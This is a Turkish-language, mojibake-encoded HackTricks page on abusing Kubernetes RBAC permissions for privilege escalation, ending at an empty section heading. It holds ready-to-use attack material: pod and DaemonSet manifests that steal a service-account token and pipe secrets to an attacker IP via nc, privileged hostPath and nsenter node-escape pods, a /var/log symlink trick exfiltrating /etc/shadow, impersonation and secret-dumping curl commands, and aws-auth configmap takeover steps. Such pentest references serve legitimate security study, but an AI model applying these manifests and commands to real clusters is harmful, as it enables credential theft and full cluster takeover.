# Kubernetes'te Rollerin/KÃ¼me Rollerinin KÃ¶tÃ¼ye KullanÄ±mÄ±

<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan ileri seviyeye Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ile!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**]'na(https://github.com/sponsors/carlospolop) gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu
* **KatÄ±lÄ±n** ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)'u **takip edin**.
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸarak PR'lar gÃ¶ndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>

Potansiyel olarak tehlikeli Roller ve KÃ¼me Rollerleri yapÄ±landÄ±rmalarÄ±nÄ± burada bulabilirsiniz.\
TÃ¼m desteklenen kaynaklarÄ± `kubectl api-resources` ile alabileceÄŸinizi unutmayÄ±n

## **AyrÄ±calÄ±k YÃ¼kseltme**

KÃ¼me iÃ§inde **farklÄ± ayrÄ±calÄ±klara sahip baÅŸka bir prensibe eriÅŸim** olarak atÄ±fta bulunulan **ayrÄ±calÄ±klarÄ± yÃ¼kseltme sanatÄ±** (kubernetes kÃ¼mesi iÃ§inde veya dÄ±ÅŸ bulutlara) elde etme, Kubernetes'te temelde **4 ana teknik ayrÄ±calÄ±klarÄ± yÃ¼kseltmek iÃ§in** bulunmaktadÄ±r:

* Kubernetes kÃ¼mesi iÃ§inde veya dÄ±ÅŸ bulutlara **daha iyi ayrÄ±calÄ±klara sahip diÄŸer kullanÄ±cÄ±/gruplar/SA'larÄ± taklit edebilmek**
* **Pod'lar oluÅŸturmak/yamalamak/Ã§alÄ±ÅŸtÄ±rmak** ve burada **daha iyi ayrÄ±calÄ±klara sahip SA'larÄ± bulabilir veya ekleyebilirsiniz**
* SA'larÄ±n tokenlarÄ±nÄ±n saklandÄ±ÄŸÄ± gibi **gizli bilgileri okuyabilmek**
* Bir konteynerden **dÃ¼ÄŸÃ¼me kaÃ§abilmek** ve bu sayede dÃ¼ÄŸÃ¼mde Ã§alÄ±ÅŸan konteynerlerin tÃ¼m gizli bilgilerini, dÃ¼ÄŸÃ¼mÃ¼n kimlik bilgilerini ve dÃ¼ÄŸÃ¼mÃ¼n bulut iÃ§indeki izinlerini (varsa) Ã§alabilmek
* Bir pod'da **port-forward Ã§alÄ±ÅŸtÄ±rma** yeteneÄŸi, bu sayede o pod iÃ§inde ilginÃ§ kaynaklara eriÅŸebilme olasÄ±lÄ±ÄŸÄ±nÄ±z olabilir.

### Herhangi Bir KaynaÄŸa veya Fiile EriÅŸim (YÄ±ldÄ±z Ä°fadesi)

**YÄ±ldÄ±z ifadesi (\*) herhangi bir kaynaÄŸa herhangi bir fiil Ã¼zerinde izin verir**. YÃ¶neticiler tarafÄ±ndan kullanÄ±lÄ±r. Bir ClusterRole iÃ§inde bu, saldÄ±rganÄ±n kÃ¼medeki herhangi bir alan adÄ±nÄ± kÃ¶tÃ¼ye kullanabileceÄŸi anlamÄ±na gelir.
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["*"]
```
### Belirli bir fiil ile Herhangi Bir KaynaÄŸa EriÅŸim

RBAC'de, belirli izinler Ã¶nemli riskler oluÅŸturur:

1. **`create`:** Herhangi bir kÃ¼me kaynaÄŸÄ±nÄ± oluÅŸturma yetkisi verir, ayrÄ±calÄ±k yÃ¼kselmesine neden olabilir.
2. **`list`:** TÃ¼m kaynaklarÄ± listeleme izni verir, hassas verilerin sÄ±zmasÄ±na neden olabilir.
3. **`get`:** Hizmet hesaplarÄ±ndan gizli bilgilere eriÅŸimi saÄŸlar, gÃ¼venlik tehdidi oluÅŸturabilir.
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["create", "list", "get"]
```
### Pod OluÅŸtur - Token Ã‡alma

Bir saldÄ±rgan, bir pod oluÅŸturma izinlerine sahipse, pod'a ayrÄ±calÄ±klÄ± bir Hizmet HesabÄ± ekleyebilir ve token'Ä± Ã§alarak Hizmet HesabÄ± olarak kimlik hÄ±rsÄ±zlÄ±ÄŸÄ± yapabilir. Bu ÅŸekilde ayrÄ±calÄ±klarÄ± artÄ±rabilir.

SaldÄ±rganÄ±n `bootstrap-signer` hizmet hesabÄ±nÄ±n token'Ä±nÄ± Ã§alacak ve saldÄ±rganÄ±n adresine gÃ¶nderecek bir pod Ã¶rneÄŸi:
```yaml
apiVersion: v1
kind: Pod
metadata:
name: alpine
namespace: kube-system
spec:
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
```
### Pod OluÅŸturma ve KaÃ§Ä±ÅŸ

AÅŸaÄŸÄ±daki, bir konteynerin sahip olabileceÄŸi tÃ¼m ayrÄ±calÄ±klarÄ± gÃ¶sterir:

* **AyrÄ±calÄ±klÄ± eriÅŸim** (korumalarÄ± devre dÄ±ÅŸÄ± bÄ±rakma ve yeteneklerin ayarlanmasÄ±)
* **hostIPC ve hostPid ad alanlarÄ±nÄ± devre dÄ±ÅŸÄ± bÄ±rakma** ayrÄ±calÄ±klarÄ± yÃ¼kseltmeye yardÄ±mcÄ± olabilir
* **hostNetwork ad alanÄ±nÄ± devre dÄ±ÅŸÄ± bÄ±rakma**, dÃ¼ÄŸÃ¼mlerin bulut ayrÄ±calÄ±klarÄ±nÄ± Ã§almak ve aÄŸlara daha iyi eriÅŸim saÄŸlamak iÃ§in eriÅŸim saÄŸlar
* **Konteyner iÃ§inde ana bilgisayarÄ± baÄŸlama**

{% code title="super_privs.yaml" %}
```yaml
apiVersion: v1
kind: Pod
metadata:
name: ubuntu
labels:
app: ubuntu
spec:
# Uncomment and specify a specific node you want to debug
# nodeName: <insert-node-name-here>
containers:
- image: ubuntu
command:
- "sleep"
- "3600" # adjust this as needed -- use only as long as you need
imagePullPolicy: IfNotPresent
name: ubuntu
securityContext:
allowPrivilegeEscalation: true
privileged: true
#capabilities:
#  add: ["NET_ADMIN", "SYS_ADMIN"] # add the capabilities you need https://man7.org/linux/man-pages/man7/capabilities.7.html
runAsUser: 0 # run as root (or any other user)
volumeMounts:
- mountPath: /host
name: host-volume
restartPolicy: Never # we want to be intentional about running this pod
hostIPC: true # Use the host's ipc namespace https://www.man7.org/linux/man-pages/man7/ipc_namespaces.7.html
hostNetwork: true # Use the host's network namespace https://www.man7.org/linux/man-pages/man7/network_namespaces.7.html
hostPID: true # Use the host's pid namespace https://man7.org/linux/man-pages/man7/pid_namespaces.7.htmlpe_
volumes:
- name: host-volume
hostPath:
path: /
```
{% endcode %}

AÅŸaÄŸÄ±daki komutla pod oluÅŸturun:
```bash
kubectl --token $token create -f mount_root.yaml
```
Bir tweet'ten bir satÄ±r ve bazÄ± eklemeler:
```bash
kubectl run r00t --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent","securityContext":{"privileged":true}}]}}'
```
Åimdi dÃ¼ÄŸÃ¼me kaÃ§Ä±ÅŸ tekniklerini kontrol etmek iÃ§in kaÃ§Ä±ÅŸ tekniklerini kullanabilirsiniz:

#### Gizlilik

Muhtemelen daha **gizli** olmak istersiniz, aÅŸaÄŸÄ±daki sayfalarda, Ã¶nceki ÅŸablonlarda belirtilen ayrÄ±calÄ±klarÄ±n yalnÄ±zca bazÄ±larÄ±nÄ± etkinleÅŸtirerek yalnÄ±zca bir kapsÃ¼l oluÅŸturursanÄ±z eriÅŸebileceÄŸiniz ÅŸeyleri gÃ¶rebilirsiniz:

* **AyrÄ±calÄ±klÄ± + hostPID**
* **YalnÄ±zca ayrÄ±calÄ±klÄ±**
* **hostPath**
* **hostPID**
* **hostNetwork**
* **hostIPC**

_Ã–nceki ayrÄ±calÄ±klÄ± kapsÃ¼l yapÄ±landÄ±rmalarÄ±nÄ± nasÄ±l oluÅŸturabileceÄŸinizi/istismar edebileceÄŸinizi_ [_https://github.com/BishopFox/badPods_](https://github.com/BishopFox/badPods) _adresinde bulabilirsiniz_

### KapsÃ¼l OluÅŸtur - Buluta TaÅŸÄ±

Bir **kapsÃ¼l** (ve isteÄŸe baÄŸlÄ± olarak bir **hizmet hesabÄ±**) **oluÅŸturabilirseniz**, bir **kapsÃ¼l veya hizmet hesabÄ±na bulut rolleri atayarak** ve ardÄ±ndan eriÅŸerek **bulut ortamÄ±nda ayrÄ±calÄ±klar elde edebilirsiniz**.\
DahasÄ±, **ana aÄŸ ad alanÄ±na sahip bir kapsÃ¼l oluÅŸturabilirseniz**, **dÃ¼ÄŸÃ¼m** Ã¶rneÄŸinin **IAM** rolÃ¼nÃ¼ **Ã§alabilirsiniz**.

Daha fazla bilgi iÃ§in kontrol edin:

{% content-ref url="pod-escape-privileges.md" %}
[pod-escape-privileges.md](pod-escape-privileges.md)
{% endcontent-ref %}

### **DaÄŸÄ±tÄ±m, Daemonset, Statefulset, Replicationcontroller, Replicaset, Ä°ÅŸler ve ZamanlanmÄ±ÅŸ Ä°ÅŸler OluÅŸtur/Patchle**

Bu izinleri **kullanarak yeni bir kapsÃ¼l oluÅŸturmak** ve Ã¶nceki Ã¶rnekte olduÄŸu gibi ayrÄ±calÄ±klar **elde etmek mÃ¼mkÃ¼ndÃ¼r**.

AÅŸaÄŸÄ±daki yaml, **bir daemonset oluÅŸturur ve kapsÃ¼l iÃ§indeki SA'nÄ±n belirteÃ§ini dÄ±ÅŸa aktarÄ±r**:
```yaml
apiVersion: apps/v1
kind: DaemonSet
metadata:
name: alpine
namespace: kube-system
spec:
selector:
matchLabels:
name: alpine
template:
metadata:
labels:
name: alpine
spec:
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
volumeMounts:
- mountPath: /root
name: mount-node-root
volumes:
- name: mount-node-root
hostPath:
path: /
```
### **Podlar Exec**

**`pods/exec`**, bir Kubernetes kaynaÄŸÄ±dÄ±r ve bir pod iÃ§inde bir kabukta komut Ã§alÄ±ÅŸtÄ±rmak iÃ§in kullanÄ±lÄ±r. Bu, **konteynerler iÃ§inde komut Ã§alÄ±ÅŸtÄ±rmaya veya bir kabuk almayÄ±** mÃ¼mkÃ¼n kÄ±lar.

Bu nedenle, bir podun iÃ§ine girip SA'nÄ±n belirteci Ã§alÄ±nabilir veya ayrÄ±calÄ±klÄ± bir poda girebilir, dÃ¼ÄŸÃ¼me kaÃ§abilir ve dÃ¼ÄŸÃ¼mdeki tÃ¼m podlarÄ±n belgelerini Ã§alabilir ve dÃ¼ÄŸÃ¼mÃ¼ (kÃ¶tÃ¼ye) kullanabilirsiniz:
```bash
kubectl exec -it <POD_NAME> -n <NAMESPACE> -- sh
```
### port-forward

Bu izin, belirtilen pod iÃ§inde Ã§alÄ±ÅŸan uygulamalarÄ± hata ayÄ±klamak iÃ§in kolayca eriÅŸilebilir kÄ±lmak amacÄ±yla **bir yerel baÄŸlantÄ± noktasÄ±nÄ± belirtilen pod iÃ§indeki bir baÄŸlantÄ± noktasÄ±na yÃ¶nlendirmeyi** saÄŸlar, ancak bir saldÄ±rgan bu izni kullanarak pod iÃ§inde ilginÃ§ (Ã¶rneÄŸin DB'ler) veya savunmasÄ±z uygulamalara (web?) eriÅŸebilir:
```
kubectl port-forward pod/mypod 5000:5000
```
### Ana Bilgisayar YazÄ±labilir /var/log/ KaÃ§Ä±ÅŸÄ±

[**Bu araÅŸtÄ±rmada belirtildiÄŸi gibi**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html), eÄŸer **ana bilgisayarda `/var/log/` dizini baÄŸlanmÄ±ÅŸ** bir pod'a eriÅŸebilir veya oluÅŸturabilirseniz, **konteynerden kaÃ§abilirsiniz**.\
Bu temelde, **Kube-API'nin bir konteynerin log'larÄ±nÄ± almayÄ± denediÄŸinde** ( `kubectl logs <pod>` kullanarak), **Kubelet** servisinin `/logs/` uÃ§ noktasÄ±nÄ± kullanarak pod'un `0.log` dosyasÄ±nÄ± istediÄŸini belirtir.\
Kubelet servisi, konteynerin `/var/log` dosya sisteminin temelde **aÃ§Ä±ÄŸa Ã§Ä±karÄ±ldÄ±ÄŸÄ±** `/logs/` uÃ§ noktasÄ±nÄ± sunar.

Bu nedenle, bir saldÄ±rganÄ±n **konteynerin /var/log/ klasÃ¶rÃ¼ne yazma eriÅŸimi** olduÄŸunda, bu davranÄ±ÅŸlarÄ± 2 ÅŸekilde kÃ¶tÃ¼ye kullanabilir:

* Genellikle `/var/logs/pods/namespace_pod_uid/container/0.log` konumunda bulunan kendi konteynerinin `0.log` dosyasÄ±nÄ± **Ã¶rneÄŸin `/etc/shadow`'a iÅŸaret eden bir sembolik baÄŸ yaparak** deÄŸiÅŸtirme. ArdÄ±ndan, ana bilgisayarÄ±n shadow dosyasÄ±nÄ± dÄ±ÅŸa aktarabilirsiniz:
```bash
kubectl logs escaper
failed to get parse function: unsupported log format: "root::::::::\n"
kubectl logs escaper --tail=2
failed to get parse function: unsupported log format: "systemd-resolve:*:::::::\n"
# Keep incrementing tail to exfiltrate the whole file
```
* EÄŸer saldÄ±rganÄ±n, `nodes/log`'u okuma izinlerine sahip herhangi bir anahtar kontrolÃ¼ varsa, sadece `/host-mounted/var/log/sym` iÃ§inde `/`'e bir **sembolik baÄŸ** oluÅŸturabilir ve **`https://<gateway>:10250/logs/sym/` adresine eriÅŸtiÄŸinde ana bilgisayarÄ±n kÃ¶k** dosya sistemini listeleyebilir (sembolik baÄŸ deÄŸiÅŸtirilerek dosyalara eriÅŸim saÄŸlanabilir).
```bash
curl -k -H 'Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6Im[...]' 'https://172.17.0.1:10250/logs/sym/'
<a href="bin">bin</a>
<a href="data/">data/</a>
<a href="dev/">dev/</a>
<a href="etc/">etc/</a>
<a href="home/">home/</a>
<a href="init">init</a>
<a href="lib">lib</a>
[...]
```
**Bir laboratuvar ve otomatik saldÄ±rÄ±, [https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts**](https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts) adresinde bulunabilir.

#### readOnly korumasÄ±nÄ± atlatma <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a>

EÄŸer ÅŸanslÄ±ysanÄ±z ve yÃ¼ksek ayrÄ±calÄ±klÄ± yetenek `CAP_SYS_ADMIN` mevcutsa, sadece klasÃ¶rÃ¼ rw olarak yeniden baÄŸlayabilirsiniz:
```bash
mount -o rw,remount /hostlogs/
```
#### hostPath readOnly korumasÄ±nÄ± atlatma <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a>

[**bu araÅŸtÄ±rmada**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html) belirtildiÄŸi gibi korumayÄ± atlatmak mÃ¼mkÃ¼ndÃ¼r:
```yaml
allowedHostPaths:
- pathPrefix: "/foo"
readOnly: true
```
Bu, Ã¶ncekiler gibi kaÃ§Ä±ÅŸlarÄ± Ã¶nlemek iÃ§in bir hostPath baÄŸlama yerine bir PersistentVolume ve bir PersistentVolumeClaim kullanarak bir ana klasÃ¶rÃ¼ konteynÄ±ra yazÄ±labilir eriÅŸimle baÄŸlamayÄ± amaÃ§lÄ±yordu:
```yaml
apiVersion: v1
kind: PersistentVolume
metadata:
name: task-pv-volume-vol
labels:
type: local
spec:
storageClassName: manual
capacity:
storage: 10Gi
accessModes:
- ReadWriteOnce
hostPath:
path: "/var/log"
---
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
name: task-pv-claim-vol
spec:
storageClassName: manual
accessModes:
- ReadWriteOnce
resources:
requests:
storage: 3Gi
---
apiVersion: v1
kind: Pod
metadata:
name: task-pv-pod
spec:
volumes:
- name: task-pv-storage-vol
persistentVolumeClaim:
claimName: task-pv-claim-vol
containers:
- name: task-pv-container
image: ubuntu:latest
command: [ "sh", "-c", "sleep 1h" ]
volumeMounts:
- mountPath: "/hostlogs"
name: task-pv-storage-vol
```
### **AyrÄ±calÄ±klÄ± hesaplarÄ± taklit etme**

Bir [**kullanÄ±cÄ± taklidi**](https://kubernetes.io/docs/reference/access-authn-authz/authentication/#user-impersonation) ayrÄ±calÄ±ÄŸÄ± ile, bir saldÄ±rgan ayrÄ±calÄ±klÄ± bir hesabÄ± taklit edebilir.

Bir kullanÄ±cÄ±yÄ± taklit etmek iÃ§in `kubectl` komutunda `--as=<kullanÄ±cÄ±adÄ±>` parametresini kullanÄ±n, veya bir grup taklit etmek iÃ§in `--as-group=<grup>` kullanÄ±n:
```bash
kubectl get pods --as=system:serviceaccount:kube-system:default
kubectl get secrets --as=null --as-group=system:masters
```
Ya da REST API'sini kullanÄ±n:
```bash
curl -k -v -XGET -H "Authorization: Bearer <JWT TOKEN (of the impersonator)>" \
-H "Impersonate-Group: system:masters"\
-H "Impersonate-User: null" \
-H "Accept: application/json" \
https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```
### SÄ±rlarÄ± Listeleme

**SÄ±rlarÄ± listeleme izni, bir saldÄ±rganÄ±n aslÄ±nda sÄ±rlarÄ± okumasÄ±na izin verebilir** REST API uÃ§ noktasÄ±na eriÅŸerek:
```bash
curl -v -H "Authorization: Bearer <jwt_token>" https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```
### Bir sÄ±rrÄ± okuma - belirteÃ§ kimliklerini kaba kuvvet saldÄ±rÄ±sÄ±yla deneme

Okuma izinlerine sahip bir saldÄ±rganÄ±n sÄ±rrÄ± kullanabilmesi iÃ§in tam adÄ± gerekmektedir, daha geniÅŸ _**sÄ±rlarÄ± listeleme**_ ayrÄ±calÄ±ÄŸÄ±ndan farklÄ± olarak, hala zayÄ±flÄ±klar bulunmaktadÄ±r. Sistemdeki varsayÄ±lan hizmet hesaplarÄ± numaralandÄ±rÄ±labilir, her biri bir sÄ±rla iliÅŸkilendirilmiÅŸtir. Bu sÄ±rlarÄ±n bir ad yapÄ±sÄ± vardÄ±r: statik bir Ã¶nek ve ardÄ±ndan rastgele beÅŸ karakterlik alfasayÄ±sal bir belirteÃ§ (belirli karakterleri hariÃ§ tutarak) [kaynak koduna](https://github.com/kubernetes/kubernetes/blob/8418cccaf6a7307479f1dfeafb0d2823c1c37802/staging/src/k8s.io/apimachinery/pkg/util/rand/rand.go#L83) gÃ¶re.

BelirteÃ§, tam alfasayÄ±sal aralÄ±k yerine sÄ±nÄ±rlÄ± 27 karakterlik bir kÃ¼meden (`bcdfghjklmnpqrstvwxz2456789`) oluÅŸturulur. Bu kÄ±sÄ±tlama toplam olasÄ± kombinasyonu 14,348,907'ye (27^5) dÃ¼ÅŸÃ¼rÃ¼r. SonuÃ§ olarak, bir saldÄ±rgan muhtemelen birkaÃ§ saat iÃ§inde belirteci Ã§Ä±karmak iÃ§in kaba kuvvet saldÄ±rÄ±sÄ± gerÃ§ekleÅŸtirebilir ve hassas hizmet hesaplarÄ±na eriÅŸerek ayrÄ±calÄ±k yÃ¼kseltmesine yol aÃ§abilir.

### Sertifika Ä°mzalama Ä°stekleri

EÄŸer `certificatesigningrequests` kaynaÄŸÄ±nda **`create`** fiillerine sahipseniz (veya en azÄ±ndan `certificatesigningrequests/nodeClient` iÃ§inde), yeni bir dÃ¼ÄŸÃ¼mÃ¼n CeSR'sini **oluÅŸturabilirsiniz**.

[Belgelendirmeye gÃ¶re bu istekleri otomatik olarak onaylamak mÃ¼mkÃ¼ndÃ¼r](https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet-tls-bootstrapping/), bu durumda **ekstra izinlere ihtiyacÄ±nÄ±z yoktur**. Aksi takdirde, isteÄŸi onaylayabilmeniz gerekecektir, bu da `certificatesigningrequests/approval` iÃ§inde gÃ¼ncelleme yapmanÄ±zÄ± ve `signers` iÃ§inde `<signerNameDomain>/<signerNamePath>` veya `<signerNameDomain>/*` ile onaylamayÄ± gerektirir.

TÃ¼m gerekli izinlere sahip bir rolÃ¼n **Ã¶rneÄŸi** ÅŸÃ¶yle:
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: csr-approver
rules:
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests
verbs:
- get
- list
- watch
- create
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests/approval
verbs:
- update
- apiGroups:
- certificates.k8s.io
resources:
- signers
resourceNames:
- example.com/my-signer-name # example.com/* can be used to authorize for all signers in the 'example.com' domain
verbs:
- approve
```
Yani, yeni dÃ¼ÄŸÃ¼m CSR onaylandÄ±ktan sonra, dÃ¼ÄŸÃ¼mlerin Ã¶zel izinlerini **kÃ¶tÃ¼ye kullanarak** **sÄ±rlarÄ± Ã§alabilir** ve **yetkileri yÃ¼kseltebilirsiniz**.

[**Bu yazÄ±da**](https://www.4armed.com/blog/hacking-kubelet-on-gke/) ve [**bu yazÄ±da**](https://rhinosecuritylabs.com/cloud-security/kubelet-tls-bootstrap-privilege-escalation/) GKE K8s TLS Bootstrap yapÄ±landÄ±rmasÄ± **otomatik imzalama** ile yapÄ±landÄ±rÄ±lmÄ±ÅŸ ve yeni bir K8s DÃ¼ÄŸÃ¼mÃ¼nÃ¼n kimlik bilgilerini oluÅŸturmak iÃ§in kÃ¶tÃ¼ye kullanÄ±lmÄ±ÅŸ ve ardÄ±ndan bu kimlik bilgilerini Ã§alarak yetkileri yÃ¼kseltmek iÃ§in kÃ¶tÃ¼ye kullanÄ±lmÄ±ÅŸtÄ±r. EÄŸer **sÃ¶z konusu izinlere sahipseniz aynÄ± ÅŸeyi yapabilirsiniz**. Ä°lk Ã¶rneÄŸin, bir dÃ¼ÄŸÃ¼mÃ¼n yalnÄ±zca Ã¼zerine baÄŸlanmÄ±ÅŸ konteynerlerin sÄ±rlarÄ±na eriÅŸmesini engelleyen hatayÄ± atlamasÄ±na dikkat edin Ã§Ã¼nkÃ¼ **bir dÃ¼ÄŸÃ¼m yalnÄ±zca Ã¼zerine baÄŸlanmÄ±ÅŸ konteynerlerin sÄ±rlarÄ±na eriÅŸebilir.**

Bunu atlatmanÄ±n yolu, sadece **ilginÃ§ sÄ±rlarÄ±n bulunduÄŸu konteynerin baÄŸlÄ± olduÄŸu dÃ¼ÄŸÃ¼m adÄ± iÃ§in bir dÃ¼ÄŸÃ¼m kimlik bilgisi oluÅŸturmaktÄ±r** (ancak bunu nasÄ±l yapÄ±lacaÄŸÄ±nÄ± yalnÄ±zca ilk yazÄ±da kontrol edin):
```bash
"/O=system:nodes/CN=system:node:gke-cluster19-default-pool-6c73b1-8cj1"
```
### AWS EKS aws-auth configmaps

AWS (Amazon Web Services) kÃ¼me yÃ¶neticisi ayrÄ±calÄ±klarÄ±nÄ± elde etmek iÃ§in EKS (Elastic Kubernetes Service) kÃ¼me iÃ§inde kube-system ad alanÄ±ndaki **`configmaps`**'Ä± deÄŸiÅŸtirebilen temel kullanÄ±cÄ±lar, **aws-auth** configmap'ini Ã¼zerine yazarak bu ayrÄ±calÄ±klarÄ± elde edebilirler.\
Gerekli fiiller **`update`** ve **`patch`**'dir, ya da configmap oluÅŸturulmadÄ±ysa **`create`** kullanÄ±labilir:
```bash
# Check if config map exists
get configmap aws-auth -n kube-system -o yaml

## Yaml example
apiVersion: v1
kind: ConfigMap
metadata:
name: aws-auth
namespace: kube-system
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node:{{EC2PrivateDNSName}}
groups:
- system:masters

# Create donfig map is doesn't exist
## Using kubectl and the previous yaml
kubectl apply -f /tmp/aws-auth.yaml
## Using eksctl
eksctl create iamidentitymapping --cluster Testing --region us-east-1 --arn arn:aws:iam::123456789098:role/SomeRoleTestName --group "system:masters" --no-duplicate-arns

# Modify it
kubectl edit -n kube-system configmap/aws-auth
## You can modify it to even give access to users from other accounts
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node:{{EC2PrivateDNSName}}
groups:
- system:masters
mapUsers: |
- userarn: arn:aws:iam::098765432123:user/SomeUserTestName
username: admin
groups:
- system:masters
```
{% endcode %}

{% hint style="warning" %}
**BaÅŸka hesaplardan kullanÄ±cÄ±lara eriÅŸim saÄŸlamak iÃ§in** **`aws-auth`** kullanabilirsiniz.

Ancak `aws --profile other_account eks update-kubeconfig --name <cluster-name>` **farklÄ± bir hesaptan Ã§alÄ±ÅŸmaz**. Ancak aslÄ±nda `aws --profile other_account eks get-token --cluster-name arn:aws:eks:us-east-1:123456789098:cluster/Testing` Ã§alÄ±ÅŸÄ±r, eÄŸer sadece isim yerine kÃ¼menin ARN'sini koyarsanÄ±z.\
`kubectl`'yi Ã§alÄ±ÅŸtÄ±rmak iÃ§in, sadece **kurbanÄ±n kubeconfig'ini yapÄ±landÄ±rdÄ±ÄŸÄ±nÄ±zdan** ve aws exec argÃ¼manlarÄ±na `--profile other_account_role` eklediÄŸinizden emin olun, bÃ¶ylece kubectl diÄŸer hesap profili kullanarak belirteci alacak ve AWS ile iletiÅŸim kuracaktÄ±r.
{% endhint %}

### GKE'de YÃ¼kselme

**GCP prensiplerine K8s izinleri atamanÄ±n 2 yolu** vardÄ±r. Her durumda prensip ayrÄ±ca kÃ¼me eriÅŸimine eriÅŸim saÄŸlamak iÃ§in **`container.clusters.get`** iznine ihtiyaÃ§ duyar, ya da **kendi kubectl yapÄ±landÄ±rma dosyanÄ±zÄ± oluÅŸturmanÄ±z** gerekecektir (aÅŸaÄŸÄ±daki baÄŸlantÄ±yÄ± takip edin).

{% hint style="warning" %}
K8s api uÃ§ noktasÄ±yla iletiÅŸim kurulurken, **GCP kimlik doÄŸrulama belirteci gÃ¶nderilecektir**. ArdÄ±ndan, GCP, K8s api uÃ§ noktasÄ± aracÄ±lÄ±ÄŸÄ±yla Ã¶nce prensibin (e-posta ile) kÃ¼me iÃ§inde herhangi bir eriÅŸime sahip olup olmadÄ±ÄŸÄ±nÄ± kontrol edecek, ardÄ±ndan GCP IAM aracÄ±lÄ±ÄŸÄ±yla herhangi bir eriÅŸime sahip olup olmadÄ±ÄŸÄ±nÄ± kontrol edecektir.\
EÄŸer bunlardan **herhangi biri doÄŸruysa**, yanÄ±t verilecektir. EÄŸer **deÄŸilse**, GCP IAM aracÄ±lÄ±ÄŸÄ±yla izin verilmesi gerektiÄŸini belirten bir hata verilecektir.
{% endhint %}

ArdÄ±ndan, ilk yÃ¶ntem **GCP IAM** kullanmaktÄ±r, K8s izinleri **eÅŸdeÄŸer GCP IAM izinlerine** sahiptir ve eÄŸer prensip bunlara sahipse, bunlarÄ± kullanabilir.

{% content-ref url="../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md" %}
[gcp-container-privesc.md](../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md)
{% endcontent-ref %}

Ä°kinci yÃ¶ntem, **kullanÄ±cÄ±yÄ± kimliÄŸine gÃ¶re** (GCP hizmet hesaplarÄ± dahil) **kÃ¼me iÃ§inde K8s izinleri atamaktÄ±r**.

### serviceaccounts belirteci oluÅŸturma

**TokenRequests** (`serviceaccounts/token` oluÅŸturabilen prensipler) K8s api uÃ§ noktasÄ±yla iletiÅŸim kurulduÄŸunda SAs (bilgi [**burada**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/token\_request.rego)).

### ephemeralcontainers

**`pods/ephemeralcontainers`**'Ä± **`gÃ¼ncelleme`** veya **`yama`** yapabilen prensipler, baÅŸka podlarda **kod yÃ¼rÃ¼tme yetkisi** kazanabilir ve bir ayrÄ±calÄ±klÄ± securityContext ile geÃ§ici bir konteyner ekleyerek kendi dÃ¼ÄŸÃ¼mÃ¼ne **kaÃ§abilir**.

### ValidatingWebhookConfigurations veya MutatingWebhookConfigurations

